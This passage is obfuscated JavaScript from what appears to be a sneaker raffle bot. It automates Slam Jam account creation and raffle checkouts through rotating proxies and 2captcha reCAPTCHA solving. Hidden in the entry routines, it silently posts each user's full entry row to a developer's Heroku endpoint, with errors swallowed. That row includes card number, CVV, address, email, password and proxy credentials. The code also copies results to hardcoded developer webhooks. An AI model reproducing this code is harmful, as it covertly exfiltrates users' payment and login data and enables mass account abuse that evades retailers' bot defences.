                            _0x42245e[_0x335920]['Postcode'] == undefined && (_0x42245e[_0x335920]['Postcode'] = _0x42245e[_0x335920]['Zip']);
                            await _0x367140['type']('#zip_code', '' + _0x42245e[_0x335920]['Postcode']), await _0xf09eb2(0x320), await _0x367140['type']('#city', '' + _0x42245e[_0x335920]['City']), await _0xf09eb2(0x320), await _0x367140['type']('#bday', '01/01/1994'), await _0xf09eb2(0x320), await _0x367140['type']('#instagram', '' + _0x42245e[_0x335920]['Follower']), await _0xf09eb2(0x352);
                            if (_0x42245e[_0x335920]['Size'] == 'RANDOM') {
                                const _0x5405d9 = await _0x367140['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x56c0ec => {
                                    return _0x56c0ec['map'](_0x12d965 => _0x12d965['textContent']);
                                });
                                var _0x562714 = Math['round'](Math['random']() * (_0x5405d9['length'] - 0x1));
                                console['log'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x5405d9[_0x562714]), await _0x367140['click']('label[data-eu-size=\x22' + _0x5405d9[_0x562714] + '\x22]');
                            } else {
                                console['log'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x42245e[_0x335920]['Size']);
                                try {
                                    await _0x367140['click']('label[data-eu-size=\x22' + _0x42245e[_0x335920]['Size'] + '\x22]');
                                } catch {
                                    await _0x367140['click']('label[data-eu-size=\x22' + _0x42245e[_0x335920]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xf09eb2(0xbb8), await _0x367140['$$eval']('.raffle__checkbox-label', _0x5ebe52 => _0x5ebe52['forEach'](_0x387f96 => _0x387f96['click']())), await _0xf09eb2(0x7d0), console['log'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x367140['click']('#raffle__form-submit'), await _0xf09eb2(0x1388);
                            try {
                                await _0x367140['waitForSelector']('#raffle__confirmation-message-container'), _0x1778e7 = 'no', _0x3ed4cd(_0x42245e[_0x335920], _0x290c27), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x1233aa = _0x42245e[_0x335920];
                                try {
                                    prxdata = {
                                        'username': _0x1c4b49['replace']('#', ''),
                                        'module': _0x290c27['name'],
                                        'entrydata': JSON['stringify'](_0x1233aa),
                                        'proxy': '' + _0x9cf5f5[_0x335920]
                                    };
                                    var _0x25e333 = JSON['stringify'](prxdata);
                                    let _0x20c723 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x25e333, _0x20c723);
                                } catch (_0x208b24) {
                                }
                            } catch (_0x37a825) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x37a825));
                            }
                        } catch (_0x64e0e3) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20' + _0x64e0e3)), _0x1778e7 = 'yes';
                        } finally {
                            _0x419887 && _0x419887['close']();
                            if (_0x1778e7 == 'yes' && _0x4f3a72 != 0x5 && _0x450569 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4f3a72 + '\x20/\x205)')), _0x335920 = _0x335920 - 0x1, _0x4f3a72 = _0x4f3a72 + 0x1;
                                continue;
                            }
                            _0x1778e7 == 'yes' && _0x4f3a72 >= 0x5 && (_0x3f94a0(_0x42245e[_0x335920], _0x290c27), _0x1778e7 = 'no', _0x4f3a72 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2387fd, _0x2718da, _0x2355f3) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x47ce13 = 0x0; _0x47ce13 < _0x2718da['length']; _0x47ce13++) {
                        if (_0x40a3c9 != 'yes')
                            var _0x40a3c9 = '', _0x53c433 = 0x0;
                        var _0x3fdafa = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1c4b49
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1940dd['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x233a0d
                                }
                            ]
                        }];
                        const _0xf0d6e9 = { 'embeds': _0x3fdafa };
                        _0x3e9ae7(_0x2387fd['name'] + '\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20/\x20' + _0x2718da['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        try {
                            await _0xf6702b(_0x2718da, _0x47ce13);
                        } catch {
                            _0x40a3c9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x33dba1 = await _0x22cd2f(_0x2718da[_0x47ce13], _0x2387fd, 'acc', ![]);
                        const _0x1a432e = { 'succesDEVMSG': { 'embeds': [_0x33dba1] } };
                        if (_0x2718da[_0x47ce13]['Email'] == '' || _0x2718da[_0x47ce13]['FirstName'] == '' || _0x2718da[_0x47ce13]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xf09eb2(0x7d0);
                            continue;
                        }
                        (_0x2718da[_0x47ce13]['Password'] == '' || _0x2718da[_0x47ce13] == undefined) && _0x2718da[_0x47ce13]['Password'] == 'JRaffles23!';
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x5eab04 = _0x2355f3[_0x47ce13]['split'](':');
                        else
                            var _0x16d8dc = Math['round'](Math['random']() * (_0x2355f3['length'] - 0x1)), _0x5eab04 = _0x2355f3[_0x16d8dc]['split'](':');
                        var _0x48dc14;
                        try {
                            _0x48dc14 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5eab04[0x0] + ':' + _0x5eab04[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x48dc14 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5eab04[0x0] + ':' + _0x5eab04[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x369bc2 = await _0x48dc14['newPage']();
                            await _0x369bc2['authenticate']({
                                'username': '' + _0x5eab04[0x2],
                                'password': '' + _0x5eab04[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x369bc2['setRequestInterception'](!![]), _0x369bc2['on']('request', _0x723b2e => {
                                _0x723b2e['resourceType']() === 'image' || _0x723b2e['resourceType']() === 'font' || _0x723b2e['resourceType']() === 'media' ? _0x723b2e['abort']() : _0x723b2e['continue']();
                            }), await _0x369bc2['goto']('https://drop.slamjam.com/account/register'), await _0xf09eb2(0xbb8), await _0x369bc2['waitForSelector']('#FirstName'), await _0x369bc2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x369bc2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Filling\x20information'), await _0xf09eb2(0x4b0), await _0x369bc2['type']('#FirstName', '' + _0x2718da[_0x47ce13]['FirstName']), await _0xf09eb2(0x226), await _0x369bc2['type']('#LastName', '' + _0x2718da[_0x47ce13]['LastName']), await _0xf09eb2(0x226), await _0x369bc2['type']('#Email', '' + _0x2718da[_0x47ce13]['Email']), await _0xf09eb2(0x2ee), await _0x369bc2['type']('#ConfirmEmail', '' + _0x2718da[_0x47ce13]['Email']), await _0xf09eb2(0x2ee), await _0x369bc2['type']('#CreatePassword', '' + _0x2718da[_0x47ce13]['Password']), await _0xf09eb2(0x2ee), await _0x369bc2['type']('#CreateConfirmPassword', '' + _0x2718da[_0x47ce13]['Password']), await _0xf09eb2(0x226), console['log'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Submitting..'), await _0x369bc2['$eval']('#create_customer', _0x56d1d2 => _0x56d1d2['submit']()), await _0xf09eb2(0x1388), console['log'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20' + _0x4f1d86['cyan']('Solving\x20Captcha')), await _0x369bc2['solveRecaptchas'](), console['log'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x369bc2['$eval']('.shopify-challenge__container\x20>\x20form', _0x134ac7 => _0x134ac7['submit']());
                            try {
                                await _0x369bc2['waitForSelector']('.product-card__image'), await _0xf09eb2(0x1f4), _0x40a3c9 = 'no', console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Account\x20' + _0x2718da[_0x47ce13]['Email'] + '\x20Generated!')), _0x4b4581['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x2718da[_0x47ce13]['Email'] + ',' + _0x2718da[_0x47ce13]['Password']), console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Account\x20' + _0x2718da[_0x47ce13]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x1a432e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x58a176(_0x4ebcdb, _0x1a432e['succesDEVMSG']);
                            } catch (_0x33ca1c) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x33ca1c));
                            }
                        } catch (_0x2507a2) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20' + _0x2507a2));
                        } finally {
                            _0x48dc14 && _0x48dc14['close']();
                            if (_0x40a3c9 == 'yes' && _0x53c433 != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x2387fd['name'] + ']\x20Task\x20' + (_0x47ce13 + 0x1) + '\x20:\x20Retrying\x20(' + _0x53c433 + '\x20/\x205)')), _0x47ce13 = _0x47ce13 - 0x1, _0x53c433 = _0x53c433 + 0x1;
                                continue;
                            }
                            _0x40a3c9 == 'yes' && _0x53c433 >= 0x5 && (_0x3f94a0(_0x2718da[_0x47ce13], _0x2387fd), _0x40a3c9 = 'no', _0x53c433 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x22d5c5, _0x25e18b, _0x395105) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xf2f6c0 = 0x0; _0xf2f6c0 < _0x25e18b['length']; _0xf2f6c0++) {
                        var _0xec897;
                        if (_0x1ed11c != 'yes')
                            var _0x1ed11c = '', _0x69a163 = 0x0;
                        _0x3e9ae7(_0x22d5c5['name'] + '\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20/\x20' + _0x25e18b['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        try {
                            await _0xf6702b(_0x25e18b, _0xf2f6c0);
                        } catch {
                            _0x1ed11c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x25e18b[_0xf2f6c0]['Email'] == '' || _0x25e18b[_0xf2f6c0]['Password'] == '' || _0x25e18b[_0xf2f6c0]['FirstName'] == '' || _0x25e18b[_0xf2f6c0]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x464d80 = _0x395105[_0xf2f6c0]['split'](':');
                        else
                            var _0x2ecfd3 = Math['round'](Math['random']() * (_0x395105['length'] - 0x1)), _0x464d80 = _0x395105[_0x2ecfd3]['split'](':');
                        var _0x463c26;
                        try {
                            _0x463c26 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x464d80[0x0] + ':' + _0x464d80[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x463c26 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x464d80[0x0] + ':' + _0x464d80[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a88eb = await _0x463c26['newPage']();
                            await _0x5a88eb['authenticate']({
                                'username': '' + _0x464d80[0x2],
                                'password': '' + _0x464d80[0x3]
                            }), await _0x5a88eb['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a88eb['setRequestInterception'](!![]), _0x5a88eb['on']('request', _0x2ef0f4 => {
                                _0x2ef0f4['resourceType']() === 'image' || _0x2ef0f4['resourceType']() === 'font' || _0x2ef0f4['resourceType']() === 'media' ? _0x2ef0f4['abort']() : _0x2ef0f4['continue']();
                            }), await _0x5a88eb['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5a88eb['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5a88eb['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xf09eb2(0x258), await _0x5a88eb['waitForSelector']('#CustomerEmail'), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5a88eb['type']('#CustomerEmail', '' + _0x25e18b[_0xf2f6c0]['Email']), await _0xf09eb2(0x12c), await _0x5a88eb['type']('#CustomerPassword', '' + _0x25e18b[_0xf2f6c0]['Password']), await _0xf09eb2(0x226), await _0x5a88eb['$eval']('#customer_login', _0x6ebc7b => _0x6ebc7b['submit']()), await _0xf09eb2(0x7d0), await _0x5a88eb['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20' + _0x4f1d86['cyan']('Solving\x20Captcha')), await _0x5a88eb['solveRecaptchas'](), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5a88eb['$eval']('.shopify-challenge__container\x20>\x20form', _0x390c51 => _0x390c51['submit']());
                            try {
                                await _0x5a88eb['waitForSelector']('.nav-account'), await _0xf09eb2(0x4b0);
                            } catch {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5a88eb['goto']('' + _0x25e18b[_0xf2f6c0]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xf09eb2(0xbb8), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5a88eb['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x5a88eb['click']('.product-select-variant-wrapper'), await _0xf09eb2(0x320), await _0x5a88eb['click']('li.product-select-variant__value[data-size=\x22' + _0x25e18b[_0xf2f6c0]['Size'] + '\x22]'), await _0xf09eb2(0x384), await _0x5a88eb['$eval']('#AddToCartForm-product-template-raffle', _0x3f7956 => _0x3f7956['submit']()), await _0x5a88eb['waitForSelector']('.cart-order-summary__content'), await _0xf09eb2(0x514), await _0x5a88eb['goto']('https://drop.slamjam.com/checkout'), await _0xf09eb2(0x514), await _0x5a88eb['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5a88eb['select']('#checkout_shipping_address_country', '' + _0x25e18b[_0xf2f6c0]['Country']), await _0xf09eb2(0x200), await _0x5a88eb['waitForSelector']('#checkout_shipping_address_first_name'), await _0x5a88eb['type']('#checkout_shipping_address_first_name', '' + _0x25e18b[_0xf2f6c0]['FirstName']), await _0xf09eb2(0x237), await _0x5a88eb['type']('#checkout_shipping_address_last_name', '' + _0x25e18b[_0xf2f6c0]['LastName']), await _0xf09eb2(0x1e0), await _0x5a88eb['type']('#checkout_shipping_address_address1', _0x25e18b[_0xf2f6c0]['Address1'] + '\x20' + _0x25e18b[_0xf2f6c0]['HouseNumber']), await _0xf09eb2(0x514), await _0x5a88eb['type']('#checkout_shipping_address_address2', '' + _0x25e18b[_0xf2f6c0]['Address2']), await _0xf09eb2(0x514);
                            _0x25e18b[_0xf2f6c0]['Postcode'] == undefined && (_0x25e18b[_0xf2f6c0]['Postcode'] = _0x25e18b[_0xf2f6c0]['Zip']);
                            await _0x5a88eb['type']('#checkout_shipping_address_zip', '' + _0x25e18b[_0xf2f6c0]['Postcode']), await _0xf09eb2(0x2bc), await _0x5a88eb['type']('#checkout_shipping_address_city', '' + _0x25e18b[_0xf2f6c0]['City']), await _0xf09eb2(0x320), await _0x5a88eb['type']('#checkout_shipping_address_phone', '' + _0x25e18b[_0xf2f6c0]['Phone']), await _0xf09eb2(0x320), await _0x5a88eb['click']('#continue_button'), await _0xf09eb2(0xbb8), await _0x5a88eb['waitForSelector']('.summary-title'), await _0xf09eb2(0x320), await _0x5a88eb['click']('#continue_button'), await _0xf09eb2(0x320), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x5a88eb['waitForSelector']('#checkout_credit_card_vault'), await _0xf09eb2(0x3e8);
                            var _0x83b476 = await _0x5a88eb['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x298668 = await _0x83b476['contentFrame']();
                            await _0x298668['click']('#number'), await _0xf09eb2(0x3e8), await _0x298668['type']('#number', '' + _0x25e18b[_0xf2f6c0]['CardNumber'], { 'delay': 0x78 }), _0x83b476 = await _0x5a88eb['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x298668 = await _0x83b476['contentFrame'](), await _0xf09eb2(0x1c2), await _0x298668['click']('#name'), await _0xf09eb2(0x1f4), await _0x298668['type']('#name', '' + _0x25e18b[_0xf2f6c0]['NameOnCard'], { 'delay': 0x78 }), _0x83b476 = await _0x5a88eb['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x298668 = await _0x83b476['contentFrame'](), await _0xf09eb2(0x1c2), await _0x298668['click']('#expiry'), await _0xf09eb2(0x1f4), await _0x298668['type']('#expiry', '' + _0x25e18b[_0xf2f6c0]['ExpiryDate'], { 'delay': 0x78 }), _0x83b476 = await _0x5a88eb['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x298668 = await _0x83b476['contentFrame'](), await _0xf09eb2(0x1c2), await _0x298668['click']('#verification_value'), await _0xf09eb2(0x1f4), await _0x298668['type']('#verification_value', '' + _0x25e18b[_0xf2f6c0]['CVV'], { 'delay': 0x78 }), await _0x5a88eb['$eval']('#accepts-flag-raffle', _0x3011d2 => _0x3011d2['click']()), await _0xf09eb2(0x7d0), console['log'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x5a88eb['$eval']('#continue_button', _0x1c786d => _0x1c786d['click']()), await _0xf09eb2(0x1b58), await _0x5a88eb['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x5a88eb['$eval']('.edit_checkout.animate-floating-labels', _0x2dc4ca => _0x2dc4ca['submit']()), await _0xf09eb2(0x7d0);
                            try {
                                await _0x5a88eb['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x1ed11c = 'no', _0x3ed4cd(_0x25e18b[_0xf2f6c0], _0x22d5c5), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x3470ee) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x3470ee['message']);
                            }
                            var _0x29d9e8 = await _0x22cd2f(_0x25e18b[_0xf2f6c0], _0x22d5c5, 'dev', ![]), _0x40a7dc = await _0x22cd2f(_0x25e18b[_0xf2f6c0], _0x22d5c5, 'pub', ![]);
                            let _0x5108ed = _0x25e18b[_0xf2f6c0];
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'module': _0x22d5c5['name'],
                                    'entrydata': JSON['stringify'](_0x5108ed),
                                    'proxy': '' + _0x395105[_0xf2f6c0]
                                };
                                var _0x31ceaf = JSON['stringify'](prxdata);
                                let _0xcef9b2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x31ceaf, _0xcef9b2);
                            } catch (_0x576fb4) {
                            }
                            const _0x1630dc = {
                                'succesDEVMSG': { 'embeds': [_0x29d9e8] },
                                'succesPUBMSG': { 'embeds': [_0x40a7dc] }
                            };
                            try {
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x1630dc['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x1630dc['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x1630dc['succesPUBMSG']);
                            } catch (_0x2ae8b6) {
                                console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2ae8b6));
                            }
                        } catch (_0x122e44) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20' + _0x122e44)), _0xec897 = '' + _0x122e44;
                            var _0x15b136 = await _0x22cd2f(kickz[_0xf2f6c0], _0x22d5c5, 'dev', !![], _0xec897);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x15b136] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], EMBEDS['errorDEV']), await _0x58a176(_0x45f55a, EMBEDS['errorDEV']), _0x1ed11c = 'yes';
                        } finally {
                            _0x463c26 && _0x463c26['close']();
                            if (_0x1ed11c == 'yes' && _0x69a163 != 0x5 && _0xec897 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x22d5c5['name'] + ']\x20Task\x20' + (_0xf2f6c0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x69a163 + '\x20/\x205)')), _0xf2f6c0 = _0xf2f6c0 - 0x1, _0x69a163 = _0x69a163 + 0x1;
                                continue;
                            }
                            _0x1ed11c == 'yes' && _0x69a163 >= 0x5 && (_0x3f94a0(_0x25e18b[_0xf2f6c0], _0x22d5c5), _0x1ed11c = 'no', _0x69a163 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0xe4ce5f) {
                    var _0xe0265 = await _0x48df80(), _0x228c59 = _0x4b4581['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x9b0d56 = _0x57f724['parse'](_0x228c59, { 'header': !![] })['data'];
                    for (var _0xebf44e = 0x0; _0xebf44e < _0x9b0d56['length']; _0xebf44e++) {
                        var _0x4a2ad4 = _0x9b0d56[_0xebf44e]['Store'], _0x36cf96 = _0x9b0d56[_0xebf44e]['Mode'];
                        for (var _0x33f40c of _0xa96df6) {
                            const _0x45183e = _0x33f40c['name']['includes'](_0x4a2ad4);
                            if (!_0x45183e)
                                continue;
                            for (mode of _0x33f40c['modules']) {
                                if (mode['name'] == _0x36cf96) {
                                    console['log']('Running\x20' + _0x4f1d86['cyan'](mode['name'])), await mode['function'](mode, [_0x9b0d56[_0xebf44e]], _0xe0265);
                                    var _0x3e0fdb = _0x228c59['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x4b4581['writeFileSync']('../failed-tasks.csv', _0x3e0fdb);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x32d75d = await _0x1f16f4['get']('Answer');
                    if (_0x32d75d['Answer']['toLowerCase']() == 'y') {
                        _0x4b4581['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xf09eb2(0x3e8);
                        return;
                    }
                    if (_0x32d75d['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xf09eb2(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xf09eb2(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x50ff69(_0x3d7071) {
    var _0x1ae999 = await _0x48df80(), _0x19653d = _0x4b4581['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x501a11 = _0x57f724['parse'](_0x19653d, { 'header': !![] })['data'];
